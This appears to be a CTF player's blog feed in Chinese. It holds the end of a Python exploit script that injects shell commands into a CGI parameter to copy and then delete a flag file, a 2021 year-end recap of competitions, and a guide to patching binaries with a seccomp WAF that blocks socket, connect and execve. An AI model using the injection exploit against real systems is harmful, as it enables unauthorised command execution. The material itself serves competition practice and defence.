class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"># import getopt</span><br><span class="line"># import sys</span><br><span class="line">import warnings</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"># import json</span><br><span class="line">import socket</span><br><span class="line">import socks</span><br><span class="line">#socks.setdefaultproxy(socks.HTTP, &quot;127.0.0.1&quot;, 8080)</span><br><span class="line">#socket.socket = socks.socksocket</span><br><span class="line">#context.log_levle=&#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def exp(url):</span><br><span class="line">    if url[len(url) - 1] != &#x27;/&#x27;:</span><br><span class="line">        print(&quot;[-] Target URL Format Error,The last char in url must be &#x27;/&#x27;.&quot;)</span><br><span class="line">        return False</span><br><span class="line">    </span><br><span class="line">    warnings.filterwarnings(&#x27;ignore&#x27;)</span><br><span class="line">    s = requests.session()</span><br><span class="line">    s.verify = False</span><br><span class="line">    header = &#123;</span><br><span class="line">        &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&#x27;,</span><br><span class="line">        &#x27;X-Forword-For&#x27;: &#x27;192.168.1.1&#x27;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        # print(&quot;[+] login...&quot;)</span><br><span class="line">        ret = s.get(&quot;&#123;&#125;wifictl.cgi?ring_token=1&quot;.format(url), headers=header, timeout=8)</span><br><span class="line">print(s)        </span><br><span class="line">if ret.status_code == 200:</span><br><span class="line">            if &quot;now time is&quot; in ret.content.decode():</span><br><span class="line">                time_ret = re.search(r&quot;now time is (.+?)\.\n&quot;,ret.content.decode())</span><br><span class="line">                if time_ret is None:</span><br><span class="line">                    print(&quot;[-] time_ret re error, cannot get time&quot;)</span><br><span class="line">                    return False</span><br><span class="line">                else:</span><br><span class="line">                    now_time = time_ret.group(1)</span><br><span class="line">                    print(&quot;[+] now time is &quot; + now_time)</span><br><span class="line">            else:</span><br><span class="line">                print(&quot;[-] time_ret re error, cannot get time&quot;)</span><br><span class="line">                return False</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;[-] status_code error, cannot get time&quot;)</span><br><span class="line">            return False</span><br><span class="line">        </span><br><span class="line">        cmd = &quot;a;&quot; + &quot;a&quot;*1311 + &quot;/bin/cat /flag &gt;/var/www/html/flag;&quot;</span><br><span class="line">        new_url = &quot;&#123;&#125;logctl.cgi?ring_token=&#123;&#125;&amp;aa=&#123;&#125;&quot;.format(url, int(now_time)+1, cmd)</span><br><span class="line">        ret = s.get(new_url, headers=header, timeout=8)</span><br><span class="line"></span><br><span class="line">        # if ret.status_code == 200:</span><br><span class="line">        #     print(ret.content.decode())</span><br><span class="line">        # else:</span><br><span class="line">        #     print(&quot;[-] status_code error, cannot get flag&quot;)</span><br><span class="line">        #     return False</span><br><span class="line">        ret = s.get(&quot;&#123;&#125;flag&quot;.format(url), headers=header, timeout=8)</span><br><span class="line">        if ret.status_code == 200:</span><br><span class="line">            print(ret.content.decode())</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;[-] status_code error, cannot get flag&quot;)</span><br><span class="line">            return False</span><br><span class="line">        </span><br><span class="line">        cmd = &quot;a;&quot; + &quot;a&quot;*1311 + &quot;rm /var/www/html/flag;&quot;</span><br><span class="line">        new_url = &quot;&#123;&#125;logctl.cgi?ring_token=&#123;&#125;:1&amp;aa=&#123;&#125;&quot;.format(url, int(now_time)+1, cmd)</span><br><span class="line">        ret = s.get(new_url, headers=header, timeout=8)</span><br><span class="line">        if ret.status_code == 200:</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;[-] status_code error, cannot rm flag&quot;)</span><br><span class="line">            return False</span><br><span class="line">    </span><br><span class="line">    except Exception as reason:</span><br><span class="line">        if &#x27;timed&#x27; in repr(reason) or &#x27;timeout&#x27; in repr(reason):</span><br><span class="line">            print(&#x27;[-] Fail, can not connect target for: timeout&#x27;)</span><br><span class="line">            return False</span><br><span class="line">        else:</span><br><span class="line">            print(&#x27;[-] Fail, can not connect target for: &#123;&#125;&#x27;.format(repr(reason)))</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exp(&quot;http://127.0.0.1:10000/&quot;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>年终总结</title>
      <link href="/2021/12/30/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
      <url>/2021/12/30/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h3 id="2021-12-30-年终小结"><a href="#2021-12-30-年终小结" class="headerlink" title="2021-12-30(年终小结)"></a>2021-12-30(年终小结)</h3><span id="more"></span><p>2021年就剩一天了，回想整个2021，应该算是充实的一年。</p><p><strong>一月</strong></p><p>吃了两顿烤肉，学校一顿，回家一顿，韩式烤肉yyds好吧。</p><p><a href="https://imgtu.com/i/TfzDnf"><img src="https://s4.ax1x.com/2021/12/31/TfzDnf.png" class="lazyload placeholder" data-srcset="https://s4.ax1x.com/2021/12/31/TfzDnf.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="TfzDnf.png"></a></p><p><a href="https://imgtu.com/i/Tfz0jP"><img src="https://s4.ax1x.com/2021/12/31/Tfz0jP.png" class="lazyload placeholder" data-srcset="https://s4.ax1x.com/2021/12/31/Tfz0jP.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Tfz0jP.png"></a></p><p>受到了r3kapig的<a href="https://m.toutiaocdn.com/i6852889405519036932/?app=news_article&timestamp=1609378896&use_new_style=1&req_id=202012310941350101310570773533074D&group_id=6852889405519036932&wxshare_count=2&tt_from=weixin_moments&utm_source=weixin_moments&utm_medium=toutiao_android&utm_campaign=client_share">一篇文章</a>的影响，组建一支“西邮最强小队”的想法在我心里发了芽，于是开始和文兄四处寻找web手，于是乎，我，文兄，郭总一拍即合，组成了Angrybirds。</p><p><a href="https://imgtu.com/i/Tfzd1I"><img src="https://s4.ax1x.com/2021/12/31/Tfzd1I.png" class="lazyload placeholder" data-srcset="https://s4.ax1x.com/2021/12/31/Tfzd1I.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Tfzd1I.png"></a></p><p>当时的目标就只有一个，那就是打爆学长，可惜的是到最后还是被打爆。</p><p><a href="https://imgtu.com/i/Tfzwct"><img src="https://s4.ax1x.com/2021/12/31/Tfzwct.png" class="lazyload placeholder" data-srcset="https://s4.ax1x.com/2021/12/31/Tfzwct.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Tfzwct.png"></a></p><p><strong>二月</strong></p><p>在一号这一天，耗费十几天终于拿到了第一个堆的shell，那种心情是无以言表的，激动的我奖励自己打了一天的游戏🤡</p><p><a href="https://imgtu.com/i/Tfza9A"><img src="https://s4.ax1x.com/2021/12/31/Tfza9A.png" class="lazyload placeholder" data-srcset="https://s4.ax1x.com/2021/12/31/Tfza9A.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Tfza9A.png"></a></p><p>有个HWS的比赛，看了眼题全是异构pwn当时根本不会（<del>现在也不会</del>）。也不知道当时哪来的自信，觉得只要是栈题就可以直接秒，现在想想真是可笑。</p><p><a href="https://imgtu.com/i/Tfzb4J"><img src="https://s4.ax1x.com/2021/12/31/Tfzb4J.png" class="lazyload placeholder" data-srcset="https://s4.ax1x.com/2021/12/31/Tfzb4J.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Tfzb4J.png"></a></p><p>然后快进到过年，今年在老家就呆了一两天，因为2月14是情人节，表姐他们要出去玩，所以我很自觉的就跟着她们一块去了。在本该四处拜年的时候我们却在巢湖的姥山岛上爬塔。附一张坐船回去时的照片（拍照技术有点菜，拍不出那种唯美的感觉）。</p><p><a href="https://imgtu.com/i/TfzO3R"><img src="https://s4.ax1x.com/2021/12/31/TfzO3R.png" class="lazyload placeholder" data-srcset="https://s4.ax1x.com/2021/12/31/TfzO3R.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="TfzO3R.png"></a></p><p>接着我们在一天内看了两部电影，《唐人街探案3》《你好！李焕英》。吃的啥也差不多忘了，只记得有好几顿火锅。</p><p><strong>三月</strong></p><p>从三月初就开始高强度的比赛，一周最少一次比赛，同时寻找杂项密码手这事也一直没停过，只可惜找不到同样对ctf充满热爱和野心的人。这个月似乎也没有什么特别印象深刻的事情，不是在比赛就是在准备比赛。我翻看了可以翻看的各个比赛群的管理员的空间，看着他们四处打比赛，满是羡慕。每当感觉坚持不下去了，就看看他们的空间收获动力。当时的愿望就是能够打一场线下赛，我相信这也是所有刚入门的ctfer共同的愿望。</p><p><a href="https://imgtu.com/i/TfzHN4"><img src="https://s4.ax1x.com/2021/12/31/TfzHN4.png" class="lazyload placeholder" data-srcset="https://s4.ax1x.com/2021/12/31/TfzHN4.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="TfzHN4.png"></a></p><p>因受到白绍全护网一天一千的影响，我也产生了想要去实习的想法，于是就有了下面这条短信，结果好像是卡在了实习薪资的问题上。</p><p><a href="https://imgtu.com/i/TfzLC9"><img src="https://s4.ax1x.com/2021/12/31/TfzLC9.png" class="lazyload placeholder" data-srcset="https://s4.ax1x.com/2021/12/31/TfzLC9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="TfzLC9.png"></a></p><p>在三月末的时候，我们创建了一个西邮ctf学习交流群，起初的目的是想让20级的学弟们早早接触ctf，不想让他们像我们一样直到大二才接触。</p><p><a href="https://imgtu.com/i/Tfzjjx"><img src="https://s4.ax1x.com/2021/12/31/Tfzjjx.png" class="lazyload placeholder" data-srcset="https://s4.ax1x.com/2021/12/31/Tfzjjx.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Tfzjjx.png"></a></p><p><strong>四月</strong></p><p>这个月应该是我刷题最多的一个月，原因是当时灰神在招募国赛队友，他缺一个pwn手，所以就对我进行了特(shua)训(ti)。我也记不得每天刷了多少题，只记得当时感觉自己进步的很快。</p><p><a href="https://imgtu.com/i/Tfzxu6"><img src="https://s4.ax1x.com/2021/12/31/Tfzxu6.png" class="lazyload placeholder" data-srcset="https://s4.ax1x.com/2021/12/31/Tfzxu6.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Tfzxu6.png"></a></p><p><a href="https://imgtu.com/i/TfzzDK"><img src="https://s4.ax1x.com/2021/12/31/TfzzDK.png" class="lazyload placeholder" data-srcset="https://s4.ax1x.com/2021/12/31/TfzzDK.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="TfzzDK.png"></a></p><p>四月中期突然收到灰神发的信息，让我不要懈怠，我吓了一跳，赶忙把自己正在看的书拍给他看，我心想他是咋知道我懈怠了，难道是因为看到我的qq状态是离开吗？（<del>未解之谜</del>）</p><p><a href="https://imgtu.com/i/ThS9ED"><img src="https://s4.ax1x.com/2021/12/31/ThS9ED.png" class="lazyload placeholder" data-srcset="https://s4.ax1x.com/2021/12/31/ThS9ED.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="ThS9ED.png"></a></p><p><strong>五月</strong></p><p>受蔡哥的启发，想要加一些联合团队，认识一些厉害的人，解决一些困惑我很久的问题。奈何当时对自己的能力太过自信，才学习pwn不到半年的我加上已经快是大三的老年人，根本没有加入联合战队的资格，因此四处碰壁，最后什么战队也没加上。加战队这事也就告一段落了。</p><p>在国赛初赛开始之前，很幸运的获得了一次前往线下赛的机会，更幸运的是比赛场地离我家也不远。于是Angrybirds小队有了第一次线下赛的经历，虽然是线下ctf，但也享受了一次公费旅游的机会。附一张文兄和郭总的照片。</p><p><a href="https://imgtu.com/i/ThSk8A"><img src="https://s4.ax1x.com/2021/12/31/ThSk8A.png" class="lazyload placeholder" data-srcset="https://s4.ax1x.com/2021/12/31/ThSk8A.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="ThSk8A.png"></a></p><p>接着几天就是国赛的初赛了，准备了一个月左右的我信心满满，最后却以两道题的微弱输出草草收场。还记得灰神跟我说去年的题都是签到题，嗯，果然是《签到题》。不过好事是成功进入了分区赛，也就是说我还有一个月的时间准备线下分区赛。</p><p><a href="https://imgtu.com/i/ThSSHO"><img src="https://s4.ax1x.com/2021/12/31/ThSSHO.png" class="lazyload placeholder" data-srcset="https://s4.ax1x.com/2021/12/31/ThSSHO.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="ThSSHO.png"></a></p><p>国赛初赛一结束，就开始忙作品赛，一直以准备国赛为由啥也没干。</p><p><strong>六月</strong></p><p>跟着学长们一起去了兰州打了分区赛，吃喝为主，比赛为辅。在酒店附近维哥请了一顿大盘鸡，是真的好吃。</p><p><a href="https://imgtu.com/i/ThSeDf"><img src="https://s4.ax1x.com/2021/12/31/ThSeDf.png" class="lazyload placeholder" data-srcset="https://s4.ax1x.com/2021/12/31/ThSeDf.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="ThSeDf.png"></a></p><p>也拿到了属于自己的第一个一血，以西北赛区第三名顺利进入总决赛。</p><p>分区赛结束后就到了强网杯，强网杯十几道pwn题就出来两道（<del>菜到离谱</del>）。Angrybirds也从那之后退役，改名Gleaf。</p><p>为了准备线下总决赛的awd，我们每周在bugku上进行一次线上awd，想来也是搞笑，第一次打awd不知道xshell怎么连，最终以刚连上远程服务器结束了第一次的bugku比赛。</p><p><strong>七月</strong></p><p>忙活完了学校的考试，我们直接飞去哈尔滨参加国赛总决赛，意料之中，被打爆了。题目和我平常做的题完全不是一个难度的，所以只能分析流量抄别人的答案。最终以三等奖结束了今年的国赛。欣慰的是在臧导的带领下了解了哈尔滨的历史文化以及吃到了很多的好吃的。下图是哈尔滨美食的冰山一角角角。</p><p><a href="https://imgtu.com/i/ThSKUg"><img src="https://s4.ax1x.com/2021/12/31/ThSKUg.png" class="lazyload placeholder" data-srcset="https://s4.ax1x.com/2021/12/31/ThSKUg.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="ThSKUg.png"></a></p><p>写到这我突然想起来维哥和宝哥的证书还没给递过去，下学期一定。</p><p>作品赛也进入了总决赛，忙活了近一个星期即将准备去青岛的时候给我说因为疫情取消了！唉，算了，以后有机会再去吧。</p><p><strong>八月</strong></p><p>第一次尝试了日料中的海鲜刺身，hhh，无法言表。</p><p><a href="https://imgtu.com/i/ThSuVS"><img src="https://s4.ax1x.com/2021/12/31/ThSuVS.png" class="lazyload placeholder" data-srcset="https://s4.ax1x.com/2021/12/31/ThSuVS.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="ThSuVS.png"></a></p><p>复现国赛签到题和分区赛的一个题复现到两点多（12点多睡了一下，发现躺倒后思路异常清晰，兴奋的又起来复现）</p><p>ak了一次das月赛的pwn。</p><p>打了一下祥云杯，八个pwn题出来了一半（终于有输出了，菜鸡感慨）。</p><p>这个月最重要的一件事就是认识了时等师傅（阳哥）。并且月底成立了Th0r团队，我也才算有了自己的圈子。</p><p><a href="https://imgtu.com/i/ThSmb8"><img src="https://s4.ax1x.com/2021/12/31/ThSmb8.png" class="lazyload placeholder" data-srcset="https://s4.ax1x.com/2021/12/31/ThSmb8.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="ThSmb8.png"></a></p><p><strong>九月</strong></p><p>从三四月就开始想弄一个校赛直到九月份才确定下来，放一张草稿策划案。</p><p><a href="https://imgtu.com/i/ThS18s"><img src="https://s4.ax1x.com/2021/12/31/ThS18s.png" class="lazyload placeholder" data-srcset="https://s4.ax1x.com/2021/12/31/ThS18s.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="ThS18s.png"></a></p><p>打了第五空间和长城杯，都进了线下赛。</p><p><strong>十月</strong></p><p>表姐结婚，回家替我表哥背我表姐下楼赚了一千块钱路费钱</p><p><a href="https://imgtu.com/i/ThS8vq"><img src="https://s4.ax1x.com/2021/12/31/ThS8vq.png" class="lazyload placeholder" data-srcset="https://s4.ax1x.com/2021/12/31/ThS8vq.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="ThS8vq.png"></a></p><p>去了第五空间和fmyyy、last、达达面了基，还认识了darry师傅，最后拿到了三等奖。</p><p><a href="https://imgtu.com/i/ThSlCj"><img src="https://s4.ax1x.com/2021/12/31/ThSlCj.png" class="lazyload placeholder" data-srcset="https://s4.ax1x.com/2021/12/31/ThSlCj.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="ThSlCj.png"></a></p><p>说来也巧，突然发现了我微信里唯一一个收藏就是2019年的第五空间比赛。就一下子把我的思绪拉到了2019年，刚刚高考完的我透过公交车窗户看到了公交站的海报上写着国家网络安全宣传周，并且拐角有个二维码，当时因为没来的及扫码还特地让住在其附近的老毕，帮忙拍张照片，这才有了我这个收藏。因为志愿填的是信息安全，所以想更多的了解下这个专业，可惜当时什么都不懂，看了这个海报只是觉得十分的炫酷，并没有深入的去了解这个比赛，所以就一直放在了收藏夹里。这种感觉太奇妙了，突然成为了两年前自己想要成为的人。</p><p><a href="https://imgtu.com/i/ThSM5Q"><img src="https://s4.ax1x.com/2021/12/31/ThSM5Q.png" class="lazyload placeholder" data-srcset="https://s4.ax1x.com/2021/12/31/ThSM5Q.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="ThSM5Q.png"></a></p><p>打完第五空间就紧接着赶第二天的长城杯，并没有取得很好的成绩，但去了天安门前转了转。因为正中间拍照的人很多，所以就找了个没人的地方拍了拍，证明自己来过。</p><p><a href="https://imgtu.com/i/ThS32n"><img src="https://s4.ax1x.com/2021/12/31/ThS32n.png" class="lazyload placeholder" data-srcset="https://s4.ax1x.com/2021/12/31/ThS32n.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="ThS32n.png"></a></p><p>遗憾的是没有和fmyyy吃上在北京的最后一道饭。</p><p>从北京赶回来立刻去参加了西工大办的网络安全知识竞赛，见到了feng师傅，最后是以二等奖收尾。</p><p>从亮哥手上结果了网络安全协会的大旗，忙着迎新办活动等社团杂事。</p><p><strong>十一月</strong></p><p>这个月我感觉到一直做简单的题没有什么提升，所以就开始攻克难题，尝试做那些C++pwn、webpwn、虚拟机等等类型的题，这让我感觉到了久违的进步感。</p><p>和fmyyy一起进了深育杯、安洵杯。</p><p>西湖论剑貌似也进了，前几天让我们填了一些信息，但不确定，因为到现在榜也没放出来。</p><p><strong>十二月</strong></p><p>去了趟成都，感受了程度的辣，放一张吃完后剩的底，红的恐怖。</p><p><a href="https://imgtu.com/i/ThSJK0"><img src="https://s4.ax1x.com/2021/12/31/ThSJK0.png" class="lazyload placeholder" data-srcset="https://s4.ax1x.com/2021/12/31/ThSJK0.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="ThSJK0.png"></a></p><p>安洵杯最后被fmyyy👴带到了二等奖。最主要的是面基到了lighting的大部分师傅。</p><p><a href="https://imgtu.com/i/ThizDI"><img src="https://s4.ax1x.com/2021/12/31/ThizDI.png" class="lazyload placeholder" data-srcset="https://s4.ax1x.com/2021/12/31/ThizDI.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="ThizDI.png"></a></p><p>回学校刚过一天，又去了江西。住的酒店很高档，长见识了属于是，可惜并没有拍很多照片。</p><p>回来没过多少天西安的疫情就爆发了。</p><p>和烨一直在准备联合新生赛，但弄着弄着好像范围越来越大，不管了，我的题出完就ok。今天也终于等到了新生赛报名通道的开放。</p><p><a href="https://imgtu.com/i/ThF324"><img src="https://s4.ax1x.com/2021/12/31/ThF324.png" class="lazyload placeholder" data-srcset="https://s4.ax1x.com/2021/12/31/ThF324.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="ThF324.png"></a></p><p>最后，祝各位师傅们明天元旦快乐！</p><p>​                                                                                                                        ——2021-12-31 13：34 完 </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pwnwaf</title>
      <link href="/2021/12/17/pwnwaf/"/>
      <url>/2021/12/17/pwnwaf/</url>
      
        <content type="html"><![CDATA[<h3 id="pwnwaf"><a href="#pwnwaf" class="headerlink" title="pwnwaf"></a>pwnwaf</h3><span id="more"></span><p>起因还得从第五空间线下赛说起，那时候darry师傅给我发了个github上的一个<a href="https://github.com/wjbsyc/homura_pwn_waf">pwnwaf工具</a>，当时一直装不上去，装上去后也没打过几次线下赛，所以也没怎么用过。准备在赣网杯上试试，结果早上一直没调好，也没用成。</p><p>回去后在darry师傅的帮助下，终于成功了。因此记录下该如何使用这个waf。</p><p>首先我们要找到程序的main函数地址，然后修改hpwnwaf.py文件的main_addr。patch成功后托入ida中，因为我们需要进行手动修改。</p><p>在main函数处我们先修改jmp的地址为最初main函数的入口指令，即在沙箱指令之后的某个位置（为了能最大程度的保护栈帧）。比如下面这个地方</p><p><img src="/2021/12/17/pwnwaf/image-20211217215702845.png" class="lazyload placeholder" data-srcset="/2021/12/17/pwnwaf/image-20211217215702845.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211217215702845"></p><p>然后紧接着改这个函数的jmp地址为沙箱地址（0x402000），最后再将沙箱函数的leave|ret改为jmp到程序的主函数处的地址。（写的比较绕，因为是写给我自己看的😁）。</p><p>发现这个工具可以自定义规则，<a href="http://homura.cc/blog/archives/145">参考这篇博客</a></p><p>简单来说就是将下面的代码gcc编译运行一下,规则自行添加和修改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">//gcc -g simple_syscall_seccomp.c -o simple_syscall_seccomp -lseccomp</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;seccomp.h&gt;</span><br><span class="line">#include &lt;linux/seccomp.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">int main(void)&#123;</span><br><span class="line">  scmp_filter_ctx ctx;</span><br><span class="line">  ctx = seccomp_init(SCMP_ACT_ALLOW); </span><br><span class="line"></span><br><span class="line">  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(socket), 0);</span><br><span class="line">  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(connect), 0);</span><br><span class="line">  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(bind), 0);</span><br><span class="line">  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(listen), 0);</span><br><span class="line">  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(clone), 0);  </span><br><span class="line">  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0); </span><br><span class="line">  int fd = open(&quot;./bpf.out&quot;,O_WRONLY|O_CREAT);</span><br><span class="line">  seccomp_export_bpf(ctx,fd);</span><br><span class="line">  close(fd);</span><br><span class="line">  seccomp_load(ctx);</span><br><span class="line">  system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后用下面这个命令,导出数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$hexdump bpf.out -C</span><br><span class="line">00000000  20 00 00 00 04 00 00 00  15 00 00 09 3e 00 00 c0  | ...........&gt;...| //A = arch if (A != ARCH_X86_64)</span><br><span class="line">00000010  20 00 00 00 00 00 00 00  35 00 07 00 00 00 00 40  | .......5......@| //A = sys_number </span><br><span class="line">00000020  15 00 06 00 29 00 00 00  15 00 05 00 2a 00 00 00  |....).......*...|</span><br><span class="line">00000030  15 00 04 00 31 00 00 00  15 00 03 00 32 00 00 00  |....1.......2...|</span><br><span class="line">00000040  15 00 02 00 38 00 00 00  15 00 01 00 3b 00 00 00  |....8.......;...|</span><br><span class="line">00000050  06 00 00 00 00 00 ff 7f  06 00 00 00 00 00 00 00  |................| //return ALLOW return KILL</span><br><span class="line">00000060</span><br></pre></td></tr></table></figure><p>然后根据这些数据将其改为汇编指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">   push rbp;</span><br><span class="line">mov rbp,rsp;</span><br><span class="line">mov r15,6;</span><br><span class="line">push r15;</span><br><span class="line">mov r15,7FFF000000000006H;</span><br><span class="line">push r15;</span><br><span class="line">mov r15,3B00010015H;</span><br><span class="line">push r15;</span><br><span class="line">mov r15 , 3800020015h;</span><br><span class="line">push r15;</span><br><span class="line">mov r15 , 3200030015h;</span><br><span class="line">push r15;</span><br><span class="line">mov r15 , 3100040015h;</span><br><span class="line">push r15;</span><br><span class="line">mov r15 , 2A00050015h;</span><br><span class="line">push r15;</span><br><span class="line">mov r15 , 2900060015h;</span><br><span class="line">push r15;</span><br><span class="line">mov r15 , 4000000000070035h;</span><br><span class="line">push r15;</span><br><span class="line">mov r15 , 20h;</span><br><span class="line">push r15;</span><br><span class="line">mov r15 , 0C000003E09000015h;</span><br><span class="line">push r15;</span><br><span class="line">mov r15 , 400000020h;</span><br><span class="line">push r15;</span><br><span class="line">mov r15,rsp;</span><br><span class="line">push r15;</span><br><span class="line">mov r15 , 0ch;//这里表示的是有多少行指令</span><br><span class="line">push r15;</span><br><span class="line">mov r15,rsp;</span><br><span class="line">push r15;</span><br><span class="line">mov rdi,38;</span><br><span class="line">mov rsi,1;</span><br><span class="line">mov rdx,0;</span><br><span class="line">mov rcx,0;</span><br><span class="line">mov r8,0;</span><br><span class="line">mov rax,157;</span><br><span class="line">syscall;</span><br><span class="line">mov rdi,22;</span><br><span class="line">mov rsi,2;</span><br><span class="line">mov rdx,r15;</span><br><span class="line">mov rax,157;</span><br><span class="line">syscall;</span><br><span class="line">leave;</span><br><span class="line">ret;</span><br></pre></td></tr></table></figure><p>补：对于开了pie的程序操作过程相似，先将hpwnwaf.py的main_addr改成主函数地址，运行./patch。</p><p>接着将主函数地址处后的jmp地址改为程序最后多出的已<code>push esp</code>开头的地址如0x4030c6</p><p><img src="/2021/12/17/pwnwaf/image-20220619110559353.png" class="lazyload placeholder" data-srcset="/2021/12/17/pwnwaf/image-20220619110559353.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20220619110559353"></p><p><img src="/2021/12/17/pwnwaf/image-20220619110630291.png" class="lazyload placeholder" data-srcset="/2021/12/17/pwnwaf/image-20220619110630291.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20220619110630291"></p><p>接着将0x4030cf处的jmp后地址改为沙箱函数地址0x403000，最后将沙箱函数最后的leave ret改为jmp到主函数被改后的第一条指令地址</p><p><img src="/2021/12/17/pwnwaf/image-20220619111006341.png" class="lazyload placeholder" data-srcset="/2021/12/17/pwnwaf/image-20220619111006341.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20220619111006341"></p><p><img src="/2021/12/17/pwnwaf/image-20220619111109368.png" class="lazyload placeholder" 